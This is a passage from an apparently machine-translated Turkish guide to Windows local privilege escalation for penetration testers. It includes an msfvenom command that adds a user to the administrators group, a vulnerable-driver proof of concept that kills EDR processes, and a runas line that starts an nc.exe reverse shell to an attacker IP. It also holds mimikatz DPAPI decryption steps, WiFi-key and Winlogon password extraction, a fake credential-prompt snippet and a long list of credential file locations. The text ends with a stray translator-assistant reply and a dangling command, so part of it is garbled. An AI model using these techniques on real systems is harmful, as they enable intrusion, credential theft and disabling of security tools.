**Tespit edebilir ve exploit edebilirsiniz** bu zafiyeti metasploit ile: `exploit/windows/local/trusted\_service\_path` metasploit ile manuel olarak bir service binary oluşturabilirsiniz:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Kurtarma Eylemleri

Windows, bir servis başarısız olduğunda yapılacak eylemleri kullanıcıların belirtmesine izin verir. Bu özellik bir binary'ye işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebilirse, privilege escalation mümkün olabilir. Daha fazla ayrıntı için [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)'a bakın.

## Uygulamalar

### Yüklü Uygulamalar

Kontrol edin **binaries'in izinlerini** (belki birini overwrite edip privilege escalation elde edebilirsiniz) ve **klasörlerin** izinlerini ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Yazma İzinleri

Bazı özel dosyaları okumak için bir config file'ı değiştirebilip değiştiremeyeceğinizi veya Administrator hesabı tarafından (schedtasks) çalıştırılacak bir binary'i değiştirebilip değiştiremeyeceğinizi kontrol edin.

Sistemde zayıf folder/files permissions'larını bulmanın bir yolu şudur:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry anahtarlarını veya binary dosyalarını üzerine yazıp yazamayacağınızı kontrol edin.**\
**Okuyun** **aşağıdaki sayfayı**, ilginç **autoruns locations to escalate privileges** hakkında daha fazla bilgi edinmek için:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Muhtemel **üçüncü taraf tuhaf/zayıf** sürücüler arayın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver arbitrary kernel read/write primitive açığa çıkarıyorsa (kötü tasarlanmış IOCTL handler'larında yaygın), kernel belleğinden doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için bakın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Race-condition hatalarında, zafiyete neden olan çağrı saldırgan kontrollü bir Object Manager yolunu açıyorsa, lookup'u kasıtlı olarak yavaşlatmak (maksimum uzunluklu bileşenler veya derin dizin zincirleri kullanarak) pencereyi mikro saniyelerden onlarca mikro saniyeye uzatabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive bellek bozulma primitive'leri

Modern hive zafiyetleri, deterministik düzenler oluşturmanızı, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanızı ve metadata bozulmasını custom bir driver olmadan kernel paged-pool overflow'larına dönüştürmenizi sağlar. Tam zinciri öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Device object'lerinde FILE_DEVICE_SECURE_OPEN eksikliğinin kötüye kullanılması (LPE + EDR kill)

Bazı imzalı üçüncü‑taraf driver'lar device object'lerini güçlü bir SDDL ile IoCreateDeviceSecure aracılığıyla oluşturuyor ama DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'u ayarlamayı unutuyorlar. Bu bayrak olmadan, cihaz ekstra bir bileşen içeren bir yol üzerinden açıldığında secure DACL uygulanmaz; bu da herhangi bir ayrıcalıksız kullanıcının aşağıdaki gibi bir namespace yolu kullanarak bir handle elde etmesine izin verir:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (gerçek dünyadan bir vaka)

Bir kullanıcı cihazı açabildiğinde, driver tarafından açığa çıkarılmış yetkili IOCTL'ler LPE ve tahrifat için kötüye kullanılabilir. Gerçekte gözlemlenen örnek yetenekler:
- Herhangi bir işleme tam erişimli handle'lar döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Kısıtlanmamış raw disk okuma/yazma (offline tahrifat, boot-time persistence hileleri).
- Herhangi bir işlemi sonlandırma, Protected Process/Light (PP/PPL) dahil, böylece kullanıcı alanından kernel aracılığıyla AV/EDR öldürme imkanı.

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için önlemler
- DACL tarafından sınırlandırılması amaçlanan device nesneleri oluştururken her zaman FILE_DEVICE_SECURE_OPEN ayarını kullanın.
- Ayrıcalıklı işlemler için çağıran bağlamını doğrulayın. İşlem sonlandırmaya veya handle geri döndürmeye izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'leri (access masks, METHOD_*, input validation) kısıtlayın ve doğrudan kernel ayrıcalıkları yerine brokered modelleri düşünün.

Savunucular için tespit fikirleri
- Şüpheli aygıt adlarının (ör., \\ .\\amsdk*) kullanıcı modu açılışlarını ve kötüye kullanımı işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/engelleme listelerinizi yönetin.


## PATH DLL Hijacking

Eğer PATH içinde bulunan bir klasörde **yazma izinlerine** sahipseniz, bir process tarafından yüklenen bir DLL'i ele geçirerek **ayrıcalıkları yükseltebilirsiniz**.

PATH içindeki tüm klasörlerin izinlerini kontrol edin:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file içinde hardcoded diğer bilinen bilgisayarları kontrol et.
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Kuralları

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listele, kural oluştur, devre dışı bırak, devre dışı bırak...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir.

If you get root user you can listen on any port (ilk kez `nc.exe` ile bir porta dinleme başlattığınızda, GUI aracılığıyla `nc`'nin firewall tarafından izinli olup olmayacağını soracaktır).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz

`WSL` dosya sistemini şu klasörde inceleyebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\

The Windows Vault stores user credentials for servers, websites and other programs that **Windows** can **kullanıcıların yerine otomatik olarak oturum açmasını sağlayabilir**. At first instance, this might look like now users can store their Facebook credentials, Twitter credentials, Gmail credentials etc., so that they automatically log in via browsers. But it is not so.

Windows Vault stores credentials that Windows can log in the users automatically, which means that any **Windows uygulaması bir kaynağa erişmek için kimlik bilgisine ihtiyaç duyuyorsa** (server or a website) **can make use of this Credential Manager** & Windows Vault and use the credentials supplied instead of users entering the username and password all the time.

Unless the applications interact with Credential Manager, I don't think it is possible for them to use the credentials for a given resource. So, if your application wants to make use of the vault, it should somehow **credential manager ile iletişim kurup o kaynak için kimlik bilgilerini talep etmelidir** from the default storage vault.

Use the `cmdkey` to list the stored credentials on the machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından kaydedilmiş kimlik bilgilerini kullanmak için `runas`'ı `/savecred` seçeneği ile kullanabilirsiniz. Aşağıdaki örnek, bir SMB share üzerinden uzak bir binary'yi çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Unutmayın ki mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) tarafından da elde edilebilir.

### DPAPI

The **Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar; özellikle Windows işletim sisteminde asimetrik özel anahtarların simetrik olarak şifrelenmesi amacıyla kullanılır. Bu şifreleme, entropiye önemli katkı sağlayan bir kullanıcı veya sistem sırrını kullanır.

**DPAPI, anahtarların kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla şifrelenmesini sağlar**. Sistem şifrelemesi durumlarında ise sistemin domain kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları %APPDATA%\Microsoft\Protect\{SID} dizininde saklanır; burada {SID} kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil eder. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan master key ile aynı dosyada birlikte bulunur**, genellikle 64 byte rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, CMD'de `dir` komutuyla içerik listesinin alınamadığını, ancak PowerShell ile listelenebildiğini not etmek önemlidir).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Şifreyi çözmek için uygun argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**credentials files protected by the master password** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred`'i kullanarak şifresini çözebilirsiniz.\
Bellekten birçok **DPAPI** **masterkey**'i `sekurlsa::dpapi` modülü ile çıkarabilirsiniz (eğer root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** genellikle **scripting** ve otomasyon görevlerinde, şifrelenmiş kimlik bilgilerini pratik şekilde saklamak için kullanılır. Bu kimlik bilgileri **DPAPI** ile korunur; bu genellikle oluşturuldukları aynı kullanıcı tarafından, aynı bilgisayarda çözülebilecekleri anlamına gelir.

İçeren dosyadan bir **PS credentials**'ı **çözmek** için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları şu konumlarda bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Son Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak herhangi bir .rdg dosyasını **şifre çözün**\
Mimikatz `sekurlsa::dpapi` modülüyle bellekten **birçok DPAPI masterkeys'i çıkarabilirsiniz**

### Sticky Notes

Kullanıcılar genellikle Windows iş istasyonlarında StickyNotes uygulamasını bir veritabanı dosyası olduğunu fark etmeden **şifreleri kaydetmek** ve diğer bilgileri saklamak için kullanır. Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe'den şifreleri kurtarmak için Administrator olmanız ve High Integrity level altında çalıştırmanız gerektiğini unutmayın.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\ Eğer bu dosya mevcutsa bazı **kimlik bilgileri** yapılandırılmış olabilir ve **kurtarılabilir**.

Bu kod [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`'in var olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, birçoğu **DLL Sideloading (Bilgi için** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Kimlik Bilgileri)

### Putty Kimlik Bilgileri
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Kayıt Defterindeki SSH anahtarları

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarı içinde saklanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o yolun içinde herhangi bir kayıt bulursanız, muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

If `ssh-agent` service is not running and you want it to automatically start on boot run:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve bir makineye ssh ile giriş yapmaya çalıştım. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya ara

### Önbelleğe Alınmış GPP Parolası

Önceden, Group Policy Preferences (GPP) üzerinden bir grup makinede özel yerel administrator hesaplarının dağıtılmasına izin veren bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. Birincisi, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP'lerdeki parolalar AES256 ile, kamuya açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak şifreleniyordu ve herhangi bir kimlikli kullanıcı tarafından çözülebiliyordu. Bu durum, kullanıcıların yetki yükseltmesine neden olabilecek ciddi bir riskti.

Bu riski azaltmak için, içinde boş olmayan "cpassword" alanı bulunan yerel önbelleğe alınmış GPP dosyalarını tarayan bir fonksiyon geliştirildi. Böyle bir dosya bulunduğunda fonksiyon parolayı çözüyor ve özel bir PowerShell objesi döndürüyor. Bu obje GPP ile ilgili detayları ve dosyanın konumunu içeriyor; bu da bu güvenlik açığının tespit ve giderilmesine yardımcı oluyor.

Bu dosyaları bulmak için `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista öncesi)_ içinde ara:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'i çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak parolaları almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Konfigürasyonu
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Eğer kullanıcının bilebileceğini düşünüyorsanız, her zaman **kullanıcıdan kendi veya başka bir kullanıcının kimlik bilgilerini girmesini** isteyebilirsiniz (ancak müşteriden doğrudan **kimlik bilgilerini** **istemek** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgileri içerebilecek olası dosya adları**

Bir süre önce **passwords** içeren bilinen dosyalar (**clear-text** veya **Base64**)
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the files you want translated) and I'll translate them to Turkish following your guidelines.
```
cd C:\
